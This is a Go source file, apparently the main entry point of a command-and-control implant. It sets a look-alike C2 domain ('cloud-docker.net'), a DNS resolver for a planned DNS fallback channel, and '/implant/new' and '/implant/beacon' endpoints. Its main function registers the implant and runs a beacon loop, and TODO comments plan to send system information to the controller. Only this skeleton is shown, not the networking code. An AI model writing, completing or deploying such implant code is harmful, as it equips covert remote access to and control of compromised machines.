package main

import (
	"math/rand"
	"time"
)

const (
	C2Domain  = "cloud-docker.net"
	DNSServer = "8.8.8.8:53"
	// TODO: would use the same DOMAIN for HTTPS + DNS -> rename to these consts to be idiomatic (see above)
	C2HTTPSURI            = "https://localhost"
	C2DNSDOMAIN           = "cloud-docker.com"
	C2REGISTERENDPOINT    = "/implant/new"
	C2HTTPSBEACONENDPOINT = "/implant/beacon"
)

func init() {
	// TODO: fix - Seed is depricated
	rand.Seed(time.Now().UnixNano())
}

func main() {
	implant, err := NewImplant() // TODO: when implant registers, have it so that at first it attempts to connect via HTTPS, then if unavailble does DNS -> will not send all systeminfo in DNS?
	if err != nil {
		panic(err)
	}
	err = implant.BeaconLoop()
	if err != nil {
		panic(err)
	}
}
